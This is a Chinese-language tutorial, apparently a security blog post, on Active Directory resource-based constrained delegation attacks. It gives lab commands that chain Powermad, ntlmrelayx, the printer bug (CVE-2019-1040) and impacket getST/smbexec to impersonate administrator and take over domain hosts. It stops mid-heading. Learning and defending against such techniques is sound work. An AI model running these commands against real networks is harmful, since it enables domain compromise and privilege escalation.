<h3 id="约束性委派与基于资源的约束性委派配置差别"><a href="#约束性委派与基于资源的约束性委派配置差别" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:约束性委派与基于资源的约束性委派配置差别" class="headings">约束性委派与基于资源的约束性委派配置差别</a></h3>
<p>传统的约束委派是正向的，通过修改服务 A 的 <code>msDS-AllowedToDelegateTo</code> 属性，添加服务 B 的 SPN，设置约束委派对象（服务 B），服务 A 便可以模拟用户向域控制器请求访问服务 B 的 ST 服务票据。而基于资源的约束委派则是相反的，通过修改服务 B 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性，添加服务 A 的 SID，从而达到让服务 A 模拟用户访问 B 资源的目的。</p>
<h3 id="基于资源的约束性委派攻击"><a href="#基于资源的约束性委派攻击" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:基于资源的约束性委派攻击" class="headings">基于资源的约束性委派攻击</a></h3>
<p>该攻击由国外安全研究员 Elad Shami 提出：<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" target="_blank" rel="noopener">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></p>
<p>无论服务账号的 <code>UserAccountControl</code> 属性是否被设置为 <code>TrustedToAuthForDelegation</code> 值，服务自身都可以通过调用 S4U2Self 来为任意用户请求自身的服务票据。但是当没有设置该属性时，KDC 通过检查服务账号的 <code>TrustedToAuthForDelegation</code> 位和 <code>msDS-AllowedToDelegateTo</code> 这两个字段，发现没有被赋值，所以服务自身通过 S4U2Self 请求到的 ST 服务票据是不可转发的，因此不可转发的 ST 服务票据是无法通过 S4U2Proxy 转发到其他服务进行约束性委派认证的。但是在基于资源的约束委派过程中，不可转发的 ST 服务票据仍然可以通过 S4U2Proxy 转发到其他服务进行委派认证，并且最后服务还会返回一张可转发的 ST 服务票据。因此，如果我们能够在服务 B 上配置允许服务 A 的基于资源的约束性委派，那么就可以通过控制服务 A 使用 S4U2Self 向域控请求任意用户访问自身的服务票据，最后再使用 S4U2Proxy 转发此 ST 票据去请求访问服务 B 的可转发的 ST 服务票据，即可成功模拟任意用户访问服务 B 了。服务账号 A 可以以普通域用户的权限去创建。</p>
<p>通过利用基于资源的约束委派攻击，攻击者能够使普通域用户以域管理员身份访问远程计算机 CIFS 等服务，实现本地权限提升。但是仅仅是本地提权，并不能执行域管理员的其他操作。</p>
<h4 id="基于资源的约束性委派攻击的两个条件"><a href="#基于资源的约束性委派攻击的两个条件" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:基于资源的约束性委派攻击的两个条件" class="headings">基于资源的约束性委派攻击的两个条件</a></h4>
<ul>
<li>拥有服务 A 的权限（这里我们只需要拥有一个普通的域账号权限即可，普通的域账户默认可以创建最多十个机器账号）</li>
<li>拥有在服务 B 上配置允许服务 A 的基于资源的约束委派的权限（即拥有修改服务 B 的 <code>msDS-AllowedToActOnBehalfOfOtherldentity</code> 属性的权限）</li>
</ul>
<p>综上两个条件可以转换为拥有将机器 B 加入域的域用户的权限。因为将机器 B 加入域的域用户拥有修改 <code>msDS-AllowedToActOn BehalfOfOtherldentity</code> 属性的权限。</p>
<h4 id="基于资源的约束性委派结合-ntlm-relay-接管域控-cve-2019-1040"><a href="#基于资源的约束性委派结合-ntlm-relay-接管域控-cve-2019-1040" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:基于资源的约束性委派结合-ntlm-relay-接管域控-cve-2019-1040" class="headings">基于资源的约束性委派结合 NTLM Relay 接管域控 (CVE-2019-1040)</a></h4>
<p>先在 Win-2008 上利用普通域用户权限新建一个机器账号 <code>test1$</code> ，利用 powershell 脚本：<a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">test1</span><span class="p">$</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 或者也可以利用：https://github.com/Kevin-Robertson/Sharpmad</span>
</span></span><span class="line"><span class="cl"><span class="c"># Powermad 的 C# 版本，都方便 CobaltStrike 内存加载</span>
</span></span><span class="line"><span class="cl"><span class="c"># 创建机器账号命令：Sharpmad.exe MAQ -Action new -MachineAccount test -MachinePassword password</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202212110323.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220221211037929"></p>
<p>随意输入一个密码，例如：test，在域控 <code>P-DC</code> 上面可以看到已经创建成功</p>
<p><img src="https://oss.zjun.info/zjun.info/202202212111407.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220221211134701"></p>
<p>绕过 NTLM MIC 校验 + 打印机漏洞 + NTLM Relay + 基于资源的约束性委派组合攻击，利用 <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">impacket</a> python 脚本绕过 NTLM MIC 校验进行监听，监听 IP <code>172.16.86.136</code> 是域控 <code>P-DC</code> 的 IP</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 ntlmrelayx.py -t ldap://172.16.86.136 -smb2support --remove-mic --delegate-access --escalate-user test1$ -debug
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202212113943.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220221211336944"></p>
<p>利用打印机漏洞，通过普通有效域账号 smb 连接辅域控 <code>S-DC</code> ，并触发 SpoolService 服务错误，辅域控将通过 smb 回连至攻击者主机</p>
<p>辅域控 <code>S-DC</code> IP： <code>172.16.86.135</code></p>
<p>攻击者 IP： <code>172.16.142.51</code></p>
<p>利用脚本：<a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py" target="_blank" rel="noopener">https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 printerbug.py zjun.com/test:P@ssw0rd@172.16.86.135 172.16.142.51
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202212114783.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220221211418440"></p>
<p>成功触发， <code>test1$</code> 这个机器账号已经有了 <code>S-DC</code> 的了基于资源的约束性委派</p>
<p><img src="https://oss.zjun.info/zjun.info/202202212115620.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220221211503568"></p>
<p>得到服务票据，并导入后通过 SMB 连接。需要提前在本地 <code>/etc/hosts</code> 文件中指定对应主机名的 IP，或者将 <code>/etc/resolv.conf</code> 文件中 DNS 服务器指定为域控</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python3 getST.py -spn cifs/S-DC.zjun.com zjun/test1<span class="se">\$</span>:test -dc-ip 172.16.86.136 -impersonate administrator
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python3 smbexec.py -k -no-pass S-DC.zjun.com
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202212147670.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220221214728373"></p>
<h4 id="基于资源的约束性委派进行本地提权"><a href="#基于资源的约束性委派进行本地提权" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:基于资源的约束性委派进行本地提权" class="headings">基于资源的约束性委派进行本地提权</a></h4>
<p>有两个场景：</p>
<ul>
<li>
<p>如果拿到将机器加入域的账号的权限，则能够拿到通过该账号加入域的所有机器的 system 权限。</p>
</li>
<li>
<p>如果拿到了 Account Operators 组（账户操作组）内用户权限的话，则可以拿到除域控外所有机器的 system 权限。</p>
</li>
</ul>
<h5 id="场景一"><a href="#场景一" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:场景一" class="headings">场景一</a></h5>
<p>需要先查询将机器加入域的账号。可以利用：<a href="https://github.com/Kevin-Robertson/Sharpmad" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Sharpmad</a></p>
<p>已编译版下载：<a href="https://oss.zjun.info/file/Sharpmad.exe" target="_blank" rel="noopener">https://oss.zjun.info/file/Sharpmad.exe</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Sharpmad.exe MAQ -Action GetCreator
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202221843237.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220222184321662"></p>
<p>WIN-2008 和 WIN-2012 这两台机器是由普通域用户 test 加入域的，test 用户也不在本地管理员组中</p>
<p><img src="https://oss.zjun.info/zjun.info/202202212316648.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220221224348553"></p>
<p>还是利用 <a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1" target="_blank" rel="noopener">Powermad.ps1</a> 脚本新建一个密码为 test 的机器账号 test2</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">test2</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;test&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202221846076.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220222184604274"></p>
<p>已经成功创建，可以查看</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net group <span class="s2">&#34;domain computers&#34;</span> /domain
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202221846124.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220222184641335"></p>
<p>配置 test2 到 Win-2012 的基于资源的约束性委派，利用 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">PowerView</a> 修改 WIN-2012 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的值。需要添加的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的 value 是 <code>O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;test2 的 sid)</code> 组成的。test2 的 sid 通过 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">PowerView</a> 查询：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="n">test2</span> <span class="p">|</span> <span class="nb">select </span><span class="n">objectSid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># objectsid</span>
</span></span><span class="line"><span class="cl"><span class="c"># ---------</span>
</span></span><span class="line"><span class="cl"><span class="c"># S-1-5-21-2335421620-514153290-2844484534-1121</span>
</span></span></code></pre></div><p>即修改 value 的命令如下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2335421620-514153290-2844484534-1121)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="n">WIN</span><span class="p">-</span><span class="n">2012</span><span class="p">|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202221859772.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220222185744061"></p>
<p>其他相关命令</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 验证是否成功添加</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="n">Win</span><span class="p">-</span><span class="n">2012</span> <span class="n">-Properties</span> <span class="nb">msds-allowedtoactonbehalfofotheridentity</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 清除 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值</span>
</span></span><span class="line"><span class="cl"><span class="nb">Set-DomainObject</span> <span class="n">Win</span><span class="p">-</span><span class="n">2012</span> <span class="n">-Clear</span> <span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span> <span class="n">-Verbose</span>
</span></span></code></pre></div><p>配置完 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性之后就可以利用 impacket 通过基于资源的约束性委派去攻击目标主机了。提前在本地 <code>/etc/hosts</code> 文件中指定对应主机名的 IP，或者将 <code>/etc/resolv.conf</code> 文件中 DNS 服务器指定为域控。test2 为刚才创建的机器账号，其密码是 test。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python3 getST.py -dc-ip P-DC.zjun.com zjun.com/test2<span class="se">\$</span>:test -spn cifs/Win-2012.zjun.com -impersonate administrator
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python3 smbexec.py -no-pass -k Win-2012.zjun.com
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202221859364.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220222185904762"></p>
<p>成功获得 Win-2012 system 权限。</p>
<h5 id="场景二"><a href="#场景二" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:场景二" class="headings">场景二</a></h5>
<p>先利用 Adfind.exe 查询 Account Operators 组（账户操作组）的用户， <code>-h</code> 后是域控的 IP</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Adfind.exe -h 172.16.86.136:389 -s subtree -b <span class="nv">CN</span><span class="o">=</span><span class="s2">&#34;Account Operators&#34;</span>,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>zjun,DC<span class="o">=</span>com member
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202221956554.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220222195652035"></p>
<p>有一个 test 用户，而且 test 用户已拿下，那就可以拿下除域控外的所有主机权限。其余操作和上面场景一一致：创建一个机器账号并配置该机器账号到需要攻击主机的基于资源的约束性委派，然后利用 impacket 脚本或者 Rubeus 实现票据获取和攻击。</p>
<h4 id="利用基于资源的约束性委派打造变种黄金票据"><a href="#利用基于资源的约束性委派打造变种黄金票据" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 